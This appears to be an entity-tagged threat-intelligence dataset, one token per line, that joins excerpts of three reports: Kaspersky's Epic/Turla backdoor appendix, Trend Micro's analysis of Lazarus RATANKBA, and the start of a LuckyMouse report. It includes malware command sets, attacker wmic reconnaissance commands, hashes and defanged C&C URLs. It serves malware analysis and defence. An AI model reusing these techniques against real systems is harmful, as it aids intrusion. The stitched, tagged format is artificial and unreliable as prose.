modified
(
the
file
is
supposed
to
be
started
by
a
custom
loader
)

Exports
:
1000837F
:
ModuleStart
100083A9
:
ModuleStop
100083BB
:
start

The
main
functionality
is
implemented
in
a
single
function
that
is
called
by
the
DllMain
entry
point
.

The
exported
functions
allow
to
call
the
same
function
directly
(
exported
as
'
start
'
)
or
to
start
/
stop
it
in
a
separate
thread
(
'
ModuleStart
'
/
'
ModuleStop
'
)
and
with
slightly
different
parameters
.

This
indicates
the
backdoor
can
also
function
as
a
plugin
for
the
Turla
Carbon B_malware.backdoor
system
.

The
main
function
executes
in
an
infinite
loop
.

It
collects
most
of
the
available
information
about
the
system
,
transmits
it
to
the
C&C
server
and
executes
the
commands
it
receives
back
.

The
module
delays
execution
for
random
periods
while
it
discovers
running
processes
with
one
of
the
following
filenames
:

•
tcpdump.exe

•
windump.exe

•
ethereal.exe

•
wireshark.exe

•
ettercap.exe

•
snoop.exe

•
dsniff.exe

The
following
system
information
is
collected
:

1
.
Hardware
information
.

•
Registry
key
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SystemInformation
,
value
names
:
SystemManufacturer
,
SystemProductName
.

•
All
registry
subkeys
of
the
key
HARDWARE\DESCRIPTION\System\CentralProcessor
,
value
name
:
ProcessorNameString
.

•
Available
system
memory
status
,
total
/
free
.

2
.
OS
version
information;

the
newest
version
known
to
it
is
Windows
7
/
2008R2
.

Unidentified
versions
are
marked
as
'
not
support
this
version
of
Windows
'
.

3
.
Computer
name
(
'
ComputerNamePhysicalDnsFullyQualified
'
)
.

TLP
:
Green

For
any
inquire
please
contact
intelreports@kaspersky.com

4

4
.
User
name
,
local
group
name
.

5
.
Common
directory
names
:
system
,
current
,
temporary
directories
.

6
.
Additional
system
information
:

•
System
and
user
language
settings

•
User
locale
information
:
country
name
,
current
date
,
time
zone
.

•
Uptime

7
.
Disk
space
information
for
all
available
logical
drives
.

8
.
List
of
available
network
shares
.

9
.
List
of
all
user
accounts
,
privilege
classes
,
time
of
the
last
logon
.

10
.
List
of
current
IPV4
TCP
connections
and
UDP
listeners
.

11
.
Information
about
installed
Windows
updates
from
the
file
%WINDOWS%\SoftwareDistribution\ReportingEvents.log
.

12
.
Detailed
list
of
running
processes
and
their
owners
.

13
.
List
of
all
window
titles
.

14
.
Directory
listing
of
available
logical
drives
and
of
the
directories
:

•
Desktop

•
%TEMP%

•
%WINDOWS%\Temp

The
retrieved
information
is
compressed
using
bzip2
,
encrypted
with
AES
and
then
encoded
using
Base64
before
being
transmitted
to
the
C&C
server
.

When
there
is
a
file
waiting
for
upload
(
usually
,
this
is
file
that
contains
the
results
of
the
previously
received
and
executed
command
)
,
it
is
read
from
disk
and
uploaded
to
the
server
instead
of
the
system
information
.

The
C&C
communication
is
implemented
on
top
of
the
standard
HTTP
/
HTTPS
protocols
.

The
list
of
the
C&C
URLs
is
hardcoded
in
the
binary
but
may
be
overridden
by
further
commands
.

C&C
server
communication
cycle

TLP
:
Green

For
any
inquire
please
contact
intelreports@kaspersky.com

5

The
module
uses
Wininet
API
functions
for
issuing
HTTP
POST
requests
to
the
server
.

The
module
transmits
the
collected
information
in
the
body
of
the
POST
request
and
gets
new
commands
from
the
server's
response
.

The
request
body
can
be
empty
if
there
is
no
new
information
to
upload
.

The
response
is
usually
an
HTML
document
and
the
commands
are
Base64-encoded
strings
enclosed
in
<div>/</div>
tags
.

Every
command
is
encrypted
using
asymmetric
encryption
with
temporary
AES
session
keys
.

Each
command
is
a
mixed
text/binary
buffer
.

It
consists
of
two
parts
:
payload
and
configuration
.

The
configuration
is
an
INI
file
that
controls
the
further
behavior
of
the
module
.

It
is
extracted
into
a
temporary
file
named
%TEMP%\~D%random%.tmp
.

The
payload
,
if
exists
,
is
supposed
to
be
an
executable
file
and
may
be
executed
if
there
is
a
corresponding
command
present
in
the
INI
part
.

The
format
of
the
decoded
command
is
the
following
:

Format
of
the
C&C
command
buffer

Available
commands
are
:

Name
down

Description

Execute
a
command
,
redirect
its
output
to
the
file
%TEMP%\~D%random%.tmp
.

The
file
is
then
uploaded
during
the
next
C&C
communication
cycle
.

Change
the
C&C
URL
to
a
given
value
.

del_task

Delete
a
file
.

result

Set
the
filename
that
is
supposed
to
contain
the
results
of
command
execution
.

Effectively
,
any
existing
file
may
be
marked
for
upload
by
this
command
.

TLP
:
Green

For
any
inquire
please
contact
intelreports@kaspersky.com

6

Name

delete

name

Description

Mark
the
file
%TEMP%\~tmp085.dat
to
be
deleted
on
reboot
.

Set
the
filename
to
be
deleted
or
created
(
depends
on
other
parameters
)

TLP
:
Green

For
any
inquire
please
contact
intelreports@kaspersky.com

7

C
.
Malware
samples

Lateral
movement
tools
:

a3cbf6179d437909eb532b7319b3dafe
-
custom
keylogger

1369fee289fe7798a02cde100a5e91d8
-
UPX
compressed
'
dnsquery.exe
'

c0c03b71684eb0545ef9182f5f9928ca
-
dnsquery.exe

Epic B_malware.backdoor
/
Tavdig B_malware.backdoor
backdoors
:

4dc22c1695d1f275c3b6e503a1b171f5

111ed2f02d8af54d0b982d8c9dd4932e

7731d42b043865559258464fe1c98513

24b354f8cfb6a181906ceaf9a7ec28b0

fdba4370b60eda1ee852c6515da9da58

3ab3d463575a011dfad630da154600b5

a347af5cc3c5429911e5167b2d30e1ac


6b207521c9175d2274ba3debcc700a1d

cb264c9efa566f41975a3cebf903efb5

e9c0d32a15a24b1110fcc18ab04a6738

d102e873971aa4190a809039bc789e4d

d7ca9cf72753df7392bfeea834bcf992
-
dropped
by
the
Java
CVE-2012-1723
exploits

42b7b0bd4795fc8e336e1f145fc2d27c

ab686acde338c67bec8ab42519714273

8e90d8b68a053d22b54fb39f1cf01a41

d22b0ec4e9b2302c07f38c835a78148a

764d643e5cdf3b8d4a04b50d0bc44660

d31f1d873fa3591c027b54c2aa76a52b

ea1c266eec718323265c16b1fdc92dac

bc2eff0a1544e74462e7377cf0de5a36

d22b0ec4e9b2302c07f38c835a78148a

86f28e8d9d6bda11abcf93b76074b311

d28661163ae91848e01a733836bfe0aa

09b7f890ccded1a6210119df8a9a08f9

5c4a51ce7aa76579616a01a0a3cfab38

aa58167c57cac1bc562c77766ca249f5

3a785ede87bfbd2c1c29887e9c36c801

7731d42b043865559258464fe1c98513

0e441602449856e57d1105496023f458

TLP
:
Green

For
any
inquire
please
contact
intelreports@kaspersky.com

8

Dropper
packages
that
installs
both
Epic B_malware.backdoor
and
Turla
Carbon B_malware.backdoor
system
:

c7617251d523f3bc4189d53df1985ca9
-
Postanovlenie
apelljacionnoj
instancii.scr

0f76ef2e6572befdc2ca1ca2ab15e5a1
-
Opredelenie.scr

PDF
exploits
used
in
spearphishing
attacks
drops
Epic B_malware.backdoor
backdoor
:

6776bda19a3a8ed4c2870c34279dbaa9
-
Note_No107-41D.pdf

dba209c99df5e94c13b1f44c0f23ef2b
-
unknown.PDF

f44b1dea7e56b5eac95c12732d9d6435
-
unknown.PDF

4c65126ae52cadb76ca1a9cfb8b4ce74
-
unknown.PDF

SCR
/
EXE
files
-
used
in
spearphishing
/
social
engineering
:

4d667af648047f2bd24511ef8f36c9cc
-
NATO
position
on
Syria.scr

ab686acde338c67bec8ab42519714273
-
Russia
position
on
Syria.scr

1c3634c7777bd6667936ec279bac5c2a
-
Talking
Points.scr

80323d1f7033bf33875624914a6a6010
-
Program.scr

77083b1709681d43a1b0503057b6f096
-
Security
protocol.scr

01a15540481f28163e7b4908034efbe3
-
unknown.exe
(
'
WorldCupSec
'
)

6a24071fde3b5d713c58801dcdd62044
-
unknown.exe
(
'
WorldCupSec
'
)

626955d20325371aca2742a70d6861ab
-
unknown.exe
(
'
TadjMakhal
'
)

16eba8e5f0440a213935e1af4976d801
-
unknown.exe
(
'
RussiaPositions
'
)

0c35a8f9f9b6ab2f7e3b4408abc61f73
-
pdfview.exe

d685403d000f8f6b25a6746f6f05a51c
-
winword.exe

Fake
'
Adobe
Flash
Player
'
Epic B_malware.backdoor
backdoor
installers
:

7c52c340ec5c6f57ef2fd174e6490433
-
adobe_flash_player.exe

030f5fdb78bfc1ce7b459d3cc2cf1877
-
Shockwave_Flash_Player.exe

Fake
'
Microsoft
Security
Essentials
Quick
Scan
'
Epic B_malware.backdoor
backdoor
installer

89b0f1a3a667e5cd43f5670e12dba411

Turla
Carbon B_malware.backdoor
Pfinet
backdoors

e9580b6b13822090db018c320e80865f
-
Pfinet
backdoor

071d3b60ebec2095165b6879e41211f2
-
Pfinet
backdoor

TLP
:
Green

For
any
inquire
please
contact
intelreports@kaspersky.com
9

Turla
Carbon B_malware.backdoor
package

cb1b68d9971c2353c2d6a8119c49b51f

Related
Turla
sample
module

626576e5f0f85d77c460a322a92bb267

Java
Exploits
used
in
waterhole B_malware.backdoor
attacks

536eca0defc14eff0a38b64c74e03c79
f41077c4734ef27dec41c89223136cf8
15060a4b998d8e288589d31ccd230f86
e481f5ea90d684e5986e70e6338539b4
21cbc17b28126b88b954b3b123958b46
acae4a875cd160c015adfdea57bd62c4

TLP
:
Green

For
any
inquire
please
contact
intelreports@kaspersky.com

10

D
.
Epic B_malware.backdoor
C&C
Server
URLs
(
hacked
sites
used
as
1st
level
proxies
)
:

hxxp://losdivulgadores[.]com/wp-content/plugins/wp-themes/ B_url.cncsvr

hxxp://gspersia[.]com/first/fa/components/com_sitemap/ B_url.cncsvr

hxxp://blog.epiccosplay[.]com/wp-includes/sitemap/ B_url.cncsvr

hxxp://gofree[.]ir/wp-content/plugins/online-chat/ B_url.cncsvr

hxxp://homaxcompany[.]com/components/com_sitemap/ B_url.cncsvr

hxxp://www.hadilotfi[.]com/wp-content/themes/profile/ B_url.cncsvr

hxxp://mortezanevis[.]ir/wp-content/plugins/wp-static/ B_url.cncsvr

hxxp://ncmp2014[.]com/modules/mod_feed/feed/ B_url.cncsvr

hxxp://mebroad[.]com/wp-content/gallery/posters/img/ B_url.cncsvr

hxxp://gruenerenate[.]de/wp-content/plugins/bbpress/includes/lang/ B_url.cncsvr

hxxp://www.arshinmalalan[.]com/themes/v6/templates/css/in.php B_url.cncsvr

hxxp://products.parentsupermarket[.]com/phpMyAdmin/ B_url.cncsvr

hxxp://c-si[.]ir/includes/ B_url.cncsvr

hxxp://mkiyanpoor[.]ir/wp-includes/ B_url.cncsvr B_url.cncsvr

hxxp://www.massage-ketsch[.]de/wp-includes/ B_url.cncsvr

hxxp://onereliablesource[.]com/wp-content/plugins/sitemap/ B_url.cncsvr

hxxp://petrymantenimiento[.]com/wp-content/plugins/wordpress-form-manager/lang/ B_url.cncsvr

hxxp://ohsoverydarling[.]com/wp-content/themes/verification/ B_url.cncsvr

hxxp://poissonnerieantoine[.]com/web/wp-content/themes/titan/view/ B_url.cncsvr

hxxp://www.gholghola[.]com/azemashoorhost/smarty/tmpl/ B_url.cncsvr

hxxp://www.saglikdetay[.]com/wp-includes/images/icons/ B_url.cncsvr

hxxp://www.entesharati[.]com/wp-content/plugins/edd-paginate/ B_url.cncsvr

hxxp://iranabad[.]com/sarzamin/cms/application/classess/plugins/ B_url.cncsvr

hxxp://deltateam[.]ir/components/com_sitemap/ B_url.cncsvr

hxxp://akva-clean[.]ru/typo3temp/ B_url.cncsvr

hxxp://discontr[.]com/wp-content/themes/twentytwelve/ B_url.cncsvr

hxxp://curaj[.]net/pepeni/images/ B_url.cncsvr

hxxp://executrek[.]org/components/com_sitemap/ B_url.cncsvr

hxxp://amoodgostar[.]com/wp-content/themes/simplebanner/ B_url.cncsvr

hxxp://gayamore[.]com/gallery/090607/ B_url.cncsvr

hxxp://www.automation-net[.]ru/typo3temp/ B_url.cncsvr

hxxp://www.lacitedufleuve[.]com/Connections1/ B_url.cncsvr

hxxp://www.aspit[.]sn/administrator/modules/mod_feed/ B_url.cncsvr

TLP
:
Green

For
any
inquire
please
contact
intelreports@kaspersky.com

E
.
Intermediary
level
proxies
(
hacked
sites
used
as
2nd/3rd
level
)
:
hxxp://masterciw[.]com/ B_url.unknown

hxxp://khrn[.]tk/wp-includes/ B_url.unknown

hxxp://pradlolux[.]cz/system/helper/ B_url.unknown

hxxp://original-key[.]com/catalog/controller/payment/ B_url.unknown

hxxp://www.noraci[.]com/wp-includes/ B_url.unknown

hxxp://tuvpr[.]com/backup/wp-includes/ B_url.unknown

hxxp://www.boshraamin[.]com/wp-includes/ B_url.unknown

hxxp://www.bestjob[.]my/system/modules/comments/ B_url.unknown

hxxp://rollinghillsfitness[.]com/wp-includes/ B_url.unknown

TLP
:
Green

For
any
inquire
please
contact
intelreports@kaspersky.com

12

F
.
Motherships
,
hosting
Epic B_malware.backdoor
Control
panels
and
exploits

hxxp://avg-update.sytes[.]net/ B_url.unknown

hxxp://newsforum.servehttp[.]com/ B_url.unknown

hxxp://newsweek.servehttp[.]com/ B_url.unknown

hxxp://adobe.faqserv[.]com/ B_url.unknown

hxxp://cqcount.servehttp[.]com/ B_url.unknown

hxxp://easycounter.sytes[.]net/ B_url.unknown

hxxp://newsweek.serveblog[.]net/ B_url.unknown

hxxp://image.servepics[.]com/ B_url.unknown

hxxp://bgl.serveftp[.]net/ B_url.unknown

TLP
:
Green

For
any
inquire
please
contact
intelreports@kaspersky.com
Trend
Micro
About
TrendLabs
Security
Intelligence
Blog

Home

Search
:

Categories

Home
'
Malware
'
Lazarus
Campaign
Targeting
Cryptocurrencies
Reveals
Remote
Controller
Tool
,
an
Evolved
RATANKBA B_malware.backdoor
,
and
More
Posted
on
:
January
24
,
2018
at
5:56
am
Posted
in
:
Malware
,
Targeted
Attacks

Author
:

Trend
Micro

by
CH
Lei
,
Fyodor
Yarochkin
,
Lenart
Bermejo
,
Philippe
Z
Lin
and
Razor
Huang

Few
cybercrime
groups
have
gained
as
much
notoriety—both
for
their
actions
and
for
their
mystique—as
the
Lazarus
group
.

Since
they
first
emerged
back
in
2007
with
a
series
of
cyberespionage
attacks
against
the
South
Korean
government
,
these
threat
actors
have
successfully
managed
to
pull
off
some
of
the
most
notable
and
devastating
targeted
attacks
—
such
as
the
widelyreported
2014
Sony
hack
and
the
2016
attack
on
a
Bangladeshi
bank—in
recent
history
.

Throughout
the
Lazarus
group's
operational
history
,
few
threat
actors
have
managed
to
match
the
group
in
terms
of
both
scale
and
impact
,
due
in
large
part
to
the
wide
variety
of
tools
and
tactics
at
the
group's
disposal
.

The
malware
known
as
RATANKBA B_malware.backdoor
is
just
one
of
the
weapons
in
Lazarus
'
arsenal
.

This
malicious
software
,
which
could
have
been
active
since
late
2016
,
was
used
in
a
recent
campaign
targeting
financial
institutions
using
watering
hole
attacks
.

The
variant
used
during
these
attacks
(
TROJ_RATANKBA.A
)
delivered
multiple
payloads
that
include
hacking
tools
and
software
targeting
banking
systems
.

We
analyzed
a
new
RATANKBA B_malware.backdoor
variant
(
BKDR_RATANKBA.ZAEL–A
)
,
discovered
in
June
2017
,
that
uses
a
PowerShell
script
instead
of
its
more
traditional
PE
executable
form—a
version
that
other
researchers
also
recently
identified
.

We
identified
a
number
of
servers
Lazarus
used
as
a
backend
system
for
temporarily
holding
stolen
data
.

We
were
able
to
access
this
backend
,
which
provided
us
with
valuable
information
about
this
attack
and
its
victims
.

Around
55%
of
the
victims
of
RATANKBA's  B_malware.backdoor
Powershell
version
were
located
in
India
and
neighboring
countries
.

This
implies
that
the
Lazarus
group
could
be
is
either
collecting
intelligence
about
targets
in
this
region
,
or
is
at
an
early
stage
of
planning
.

They
could
have
also
been
performing
exercises
in
preparation
for
an
attack
against
similar
targets
.

The
majority
of
the
observed
victims
were
not
using
enterprise
versions
of
Microsoft
software
.

Less
than
5%
of
the
victims
were
Microsoft
Windows
Enterprise
users
,
which
means
that
currently
,
RATANKBA B_malware.backdoor
mostly
affects
smaller
organizations
or
individual
users
,
not
larger
organizations
.

It's
possible
that
Lazarus
is
using
tools
other
than
RATANKBA B_malware.backdoor
to
target
larger
organizations
.

Lazarus
'
backend
logs
also
record
victim
IP
addresses
.

Based
on
a
reverse
WHOIS
lookup
,
none
of
the
victims
can
be
associated
with
a
large
bank
or
a
financial
institution
.

However
,
we
did
manage
to
identify
victims
that
are
likely
employees
of
three
web
software
development
companies
in
India
and
one
in
South
Korea
.

Infection
Flow

Figure
1
:
RATANKBA B_malware.backdoor
Infection
Flow

RATANKBA B_malware.backdoor
is
delivered
to
its
victims
using
a
variety
of
lure
documents
,
including
Microsoft
Office
documents
,
malicious
CHM
files
,
and
different
script
downloaders
.

These
documents
contain
topics
discussing
either
software
development
or
digital
currencies
.

The
growth
of
cryptocurrencies
may
be
a
driving
force
behind
the
use
of
cryptocurrency-related
lures
.

An
example
of
a
lure
used
in
a
RATANKBA B_malware.backdoor
attack
can
be
seen
below
:

Figure
2
:
Malicious
CHM
file
used
as
RATANKBA B_malware.backdoor
lure

Once
the
lure's
recipient
opens
and
executes
the
file
,
a
backdoor
will
be
dropped
into
the
victim's
system
.

This
RATANKBA B_malware.backdoor
backdoor
is
what
is
used
to
communicate
with
RATANKBA's  B_malware.backdoor
Command-and-Control
(
C&C
)
server
.

We
have
observed
two
initial
conversations
with
the
C&C
server
(
all
are
done
via
HTTP
GET
or
POST
to
the
server
)
:

HTTP
POST
to
{script}.jsp?action=BaseInfo&u=XXX
:
Sends
the
victim
information
to
the
backend
server

HTTP
GET
to
{script}.jsp?action=What&u=XXX
:
Checks
if
there
are
any
pending
jobs
for
the
backdoor

This
means
that
the
backdoor
is
responsible
for
both
uploading
victim
information
,
as
well
as
executing
any
tasks
that
the
controller
has
assigned
to
it
,
which
includes
the
following
:

Killkill
:
Stops
the
backdoor's
activities

interval
:
Changes
the
interval
in
which
the
backdoor
retrieves
jobs;
the
default
interval
is
set
at
120
seconds

cmd
:
Executes
shell
commands

exe
:
Reflectively
injects
a
DLL
downloaded
from
a
specific
URL

In
addition
to
the
backdoor's
modus
operandi
,
the
attackers
will
use
a
Microsoft
WMI
commandline
tool
to
list
the
compromised
system's
running
processes
,
which
are
sent
to
the
C&C
server
:

'
C:\Windows\system32\cmd.exe
'
/c
'
wmic
process
get
processid
,
commandline
,
sessionid
|
findstr

SysWOW
'

'
C:\Windows\system32\cmd.exe
'
/c
'
wmic
process
get
processid
,
commandline
,
sessionid
|
findstr
x86
'

Technical
Analysis

During
our
analysis
,
we
collected
a
copy
of
the
RATANKBA B_malware.backdoor
malware's
Lazarus
Remote
Controller
tool
.

The
remote
controller
provides
a
user
interface
that
allows
attackers
to
send
jobs
to
any
compromised
endpoint
.

The
controller
gives
the
attackers
the
ability
to
manipulate
the
victims
'
host
by
queueing
tasks
on
the
main
server
.

RATANKBA B_malware.backdoor
retrieves
and
executes
the
tasks
,
and
retrieves
the
collected
information
.

Figure
3
:
RATANKBA B_malware.backdoor
communication
diagram

The
RATANKBA B_malware.backdoor
malware
has
a
control
model
that
does
not
use
real-time
communication
between
the
backdoor
and
the
attacker
.

Instead
,
both
the
remote
controller
and
the
backdoor
connect
to
its
main
communication
control
server
to
push
or
pull
pieces
of
information
.

The
controller
uses
a
graphical
UI
interface
and
can
be
used
to
push
code
to
the
server
,
while
the
backdoor
regularly
connects
to
the
server
to
check
for
pending
tasks
.

The
controller
downloads
the
victim
profiles
from
the
server
.

If
the
profiles
are
already
downloaded
by
the
controller
,
they
are
deleted
from
the
server
side
.

The
controller
can
post
victim-specific
tasks
as
well
as
global
specific
tasks
to
the
server
.

Below
are
the
various
functionalities
of
RATANKBA's  B_malware.backdoor
controller
:

Command
Name

get_time

delete_inf

delete_con

Function

Retrieves
the
server
time

Deletes
the
downloaded
victim
profiles

Deletes
the
connection
log
files
if
they
were

already
downloaded

Posts
a
job
to
kill
the
backdoor

Posts
a
job
for
DLL
injection

Changes
the
sleep
interval

Posts
a
job
for
command
shell
execution

Retrieves
the
job
results
and
deletes
the
posted

Posts
a
job
for
all
the
backdoors
connecting
to
the
server

Kill
:

inject

Interval

delete_cmd

broadcast_cmd
:

Figure
4
:
RATANKBA B_malware.backdoor
main
console
interface

Figure
5
:
RATANKBA B_malware.backdoor
host
manipulation
console

RATANKBA's  B_malware.backdoor
controllers
use
the
'
Nimo
Software
HTTP
Retriever
1.0
'
user-agent
string
for
its
communication
.

The
communication
protocol
format
for
the
controller
and
backdoor
is
as
follows
:

<domain>
/
<jspfilename>
.
jsp
?
action
=
<corresponding
actions
plus
additional
needed
parameters>
'

One
of
most
notable
changes
on
the
new
RATANKBA B_malware.backdoor
variant
is
that
the
new
version
was
written
in
Powershell
,
whereas
the
original
variant
was
in
PE
form
.

The
shift
from
PE
to
Powershell
makes
it
more
difficult
for
antivirus
solutions
to
detect
.

The
screenshot
below
shows
the
conversion
from
C
/
C++
code
to
Powershell
,
while
the
protocol
remained
unchanged
.

Figure
6
:
C
/
C++
version
of
RATANKBA B_malware.backdoor

Figure
7
:
Powershell
version
of
RATANKBA B_malware.backdoor

Profile
of
the
Attackers

While
we
do
not
have
any
knowledge
of
who
the
actual
Lazarus
attackers
are
,
the
data
collected
from
the
backend
systems
gives
us
some
insights
into
the
internet
usage
patterns
of
systems
likely
owned
by
Lazarus
group
members
.

Clues
regarding
the
profiles
of
the
attackers
was
also
found
,
including
those
connected
to
developers
and
at
least
one
operator
.

All
of
them
appear
to
be
native
Korean
speakers
,
or
at
least
have
Korean
language
proficiency
that
is
at
the
near-native
level
.

We
believe
at
least
one
of
them
also
understands
Chinese
.

We
also
observed
clues
that
the
attackers
are
interested
in
cryptocurrencies
such
as
Bitcoin
(
BTC
)
and
Ant
Share
(
NEO
)
.

One
of
them
transferred
shares
of
NEO
at
a
good
market
price
.

Figure
8
:
Empty
cryptocurrency
wallet
of
the
attacker

Figure
9
:
An
attacker
transfers
594
NEO
to
another
wallet
,
with
the
money
going
to
a
mixer

Figure
10
:
An
attacker
mining
Ant
Share

Defending
against
RATANKBA B_malware.backdoor

Given
Lazarus
'
use
of
a
wide
array
of
tools
and
techniques
in
their
operations
,
it's
reasonable
to
assume
that
the
group
will
continue
to
use
ever
-
evolving
tactics
in
their
malicious
activities
.

Overall
,
an
organization
will
need
multilayered
security
strategies
,
as
Lazarus
and
other
similar
groups
are
experienced
cybercriminals
who
employ
different
strategies
to
get
past
organizational
defenses
.

The
impact
of
this
malware
can
be
mitigated
with
proven
mitigation
techniques
such
as
routinely
scanning
the
network
for
any
malicious
activity
to
help
prevent
the
malware
from
entering
and
spreading
through
an
organization
.

In
addition
,
educating
employees
and
other
key
people
in
an
organization
on
social
engineering
techniques
can
allow
them
to
identify
what
to
look
out
for
when
it
comes
to
malicious
attacks
.

Other
mitigation
strategies
include
a
multilayered
approach
to
securing
the
organization's
perimeter
,
which
includes
hardening
the
endpoints
and
employing
application
control
to
help
prevent
malicious
applications
and
processes
from
being
executed
.

Trend
MicroTM
Deep
SecurityTM
and
Vulnerability
Protection
provide
virtual
patching
that
protects
endpoints
from
threats
such
as
malicious
redirections
to
malware-hosting
URLs
as
well
as
those
that
exploit
unpatched
vulnerabilities
.

OfficeScan's
Vulnerability
Protection
shields
endpoints
from
identified
and
unknown
vulnerability
exploits
even
before
patches
are
deployed
.

Trend
MicroTM
Deep
DiscoveryTM
provides
detection
,
in-depth
analysis
,
and
proactive
response
to
attacks
using
exploits
and
other
similar
threats
through
specialized
engines
,
custom
sandboxing
,
and
seamless
correlation
across
the
entire
attack
lifecycle
,
allowing
it
to
detect
these
attacks
even
without
any
engine
or
pattern
update
.

A
detailed
timeline
of
the
Lazarus
group's
operations
can
be
seen
here
.

Indicators
of
Compromise
(
IoCs
)
:

Hashes
detected
as
BKDR_RATANKBA.ZAEL-A

1768f2e9cea5f8c97007c6f822531c1c9043c151187c54ebfb289980ff63d666  B_hash

6cac0be2120be7b3592fe4e1f7c86f4abc7b168d058e07dc8975bf1eafd7cb25  B_hash

d844777dcafcde8622b9472b6cd442c50c3747579868a53a505ef2f5a4f0e26a  B_hash

db8163d054a35522d0dec35743cfd2c9872e0eb446467b573a79f84d61761471  B_hash

f7f2dd674532056c0d67ef1fb7c8ae8dd0484768604b551ee9b6c4405008fe6b  B_hash

Hashes
detected
as
CHM_DLOADER.ZCEL-A

01b047e0f3b49f8ab6ebf6795bc72ba7f63d7acbc68f65f1f8f66e34de827e49  B_hash

030b4525558f2c411f972d91b144870b388380b59372e1798926cc2958242863  B_hash

10cbb5d0974af08b5d4aa9c753e274a81348da9f8bfcaa5193fad08b79650cda  B_hash


650d7b814922b58b6580041cb0aa9d27dae7e94e6d899bbb3b4aa5f1047fca0f  B_hash

6cb1e9850dd853880bbaf68ea23243bac9c430df576fa1e679d7f26d56785984  B_hash

6d4415a2cbedc960c7c7055626c61842b3a3ca4718e2ac0e3d2ac0c7ef41b84d  B_hash

772b9b873100375c9696d87724f8efa2c8c1484853d40b52c6dc6f7759f5db01  B_hash

9d10911a7bbf26f58b5e39342540761885422b878617f864bfdb16195b7cd0f5  B_hash

d5f9a81df5061c69be9c0ed55fba7d796e1a8ebab7c609ae437c574bd7b30b48  B_hash

Hashes
detected
as
JS_DLOADER.ZBEL-A

8ff100ca86cb62117f1290e71d5f9c0519661d6c955d9fcfb71f0bbdf75b51b3  B_hash

Hashes
detected
as
X97M_DLOADR.ZBEL-A

972b598d709b66b35900dc21c5225e5f0d474f241fefa890b381089afd7d44ee  B_hash

Hashes
detected
as
VBS_DLOADR.ZAEL-A

4722138dda262a2dca5cbf9acd40f150759c006f56b7637769282dba54de0cab  B_hash

Updated
the
detection
names
on
January
25
,
2018
,
9:47
PM
PDT

Related
Posts
:

Spam
Campaign
Delivers
Cross-platform
Remote
Access
Trojan
Adwind

EITest
Campaign
Uses
Tech
Support
Scams
to
Deliver
Coinhive's
Monero
Miner

Examining
CVE-2017-9791
:
New
Apache
Struts
Remote
Code
Execution
Vulnerability

ChessMaster
Makes
its
Move
:
A
Look
into
the
Campaign's
Cyberespionage
Arsenal

Learn
how
to
protect
Enterprises
,
Small
Businesses
,
and
Home
Users
from
ransomware
:

ENTERPRISE

SMALL
BUSINESS

HOME

Tags
:
Lazarus
RATANKBA B_malware.backdoor

Comments
for
this
thread
are
now
closed
.

0
Comments

TrendLabs

Recommend

Share⤤

Login1

Sort
by
Best

Subscribe

Add
Disqus
to
your
siteAdd
DisqusAdd

Privacy

Home
and
Home
Office

For
Business

Security
Intelligence

About
Trend
Micro

Asia
Pacific
Region
(
APAC
)
:
Australia
/
New
Zealand
,
中国
,
日本
,
대한민국
,
台灣

Latin
America
Region
(
LAR
)
:
Brasil
,
México

North
America
Region
(
NABU
)
:
United
States
,
Canada

Europe
,
Middle
East
,
&
Africa
Region
(
EMEA
)
:
France
,
Deutschland
/
Österreich
/
Schweiz
,
Italia
,
Россия
,
España
,
United
Kingdom
/
Ireland

Privacy
Statement

Legal
Policies

Copyright
©
2018
Trend
Micro
Incorporated
.

All
rights
reserved
.
THREATS

CATEGORIES

TAGS

ENCYCLOPEDIA

STATISTICS

DESCRIPTIONS

English

APT
REPORTS

LuckyMouse
hits
national
LuckyMouse
hits
national
data
center
to
organize
country
-
level
waterholing
campaign

APT
Trends
report
Q3
2017

Wild
Neutron
–
Economic
espionage
threat
actor
returns
with
new
tricks

The
Naikon
APT
and
the
MsnMM
Campaigns

Darkhotel's
attacks
in
2015

The
Chronicles
of
the
Hellsing
APT
:
the
Empire
Strikes
Back

By
Denis
Legezo
on
June
13
,
2018
.
10:00
am

What
happened
?

In
March
2018
we
detected
an
ongoing
campaign
targeting
a
national
data
center
in
the
Central
Asia
that
we
believe
has
been
active
since
autumn
2017
.

The
choice
of
target
made
this
campaign
especially
significant
–
it
meant
the
attackers
gained
access
to
a
wide
range
of
government
resources
at
one
fell
swoop
.

We
believe
this
access
was
abused
,
for
example
,
by
inserting
malicious
scripts
in
the
country's
official
websites
in
order
to
conduct
watering
hole
attacks
.

The
operators
used
the
HyperBro B_malware.backdoor
T
rojan
as
their
last-stage
in-memory
remote
administration
tool
(
RAT
)
.

The
timestamps
for
these
modules
are
from
December
2017
until
January
2018
.

The
antidetection
launcher
and
decompressor
make
extensive
use
of
Metasploit's
shikata_
ga_
nai
encoder
as
well
as
LZNT
1
compression
.

Kaspersky
Lab
products
detect
the
different
artifacts
used
in
this
campaign
with
the
following
verdicts
:

Trojan.Win32.Generic
,
Trojan-Downloader.Win32.Upatre
and
Backdoor.Win32.HyperBro
.

A
full
technical
report
,
IoCs
and
YARA
rules
are
available
from
our
intelligence
reporting
service
(
contact
us
intelligence@kaspersky.com
)
.

We
use
cookies
to
make
your
experience
of
our
websites
better
.

By
using
and
f
urther
navigating
this
website
you
accept
that
some
of
your
browsing
activity
can
be
recorded
in
cookies
.

Detailed
information
about
the
use
of
cookies
on
this
website
is
available
by
clicking
on
more
inf
ormation
.

ACCEPT

Convert
webpages
or
entire
websites
to
PDF
-
PDFmyURL
!

Who's
behind
it
?

Due
to
tools
and
tactics
in
use
we
attribute
the
campaign
to
LuckyMouse
Chinese
-
speaking
actor
(
also
known
as
EmissaryPanda
and
APT
27
)
.

Also
the
C2
domain
update.iaacstudio[.]com B_url.unknown
was
previously
used
in
their
campaigns
.

The
tools
found
in
this
campaign
,
such
as
the
HyperBro B_malware.backdoor
Trojan
,
are
regularly
used
by
a
variety
of
Chinese
-
speaking
actors
.

Regarding
Metasploit's
shikata_
ga_
nai
encoder
–
although
it's
available
for
everyone
and
couldn't
be
the
basis
for
attribution
,
we
know
this
encoder
has
been
used
by
LuckyMouse
previously
.

Government
entities
,
including
the
Central
Asian
ones
also
were
a
target
for
this
actor
before
.

Due
to
LuckyMouse's
ongoing
waterholing
of
government
websites
and
the
corresponding
dates
,
we
suspect
that
one
of
the
aims
of
this
campaign
is
to
access
web
pages
via
the
data
center
and
inject
JavaScripts
into
them
.

How
did
the
malware
spread
?

The
initial
infection
vector
used
in
the
attack
against
the
data
center
is
unclear
.

Even
when
we
observed
LuckyMouse
using
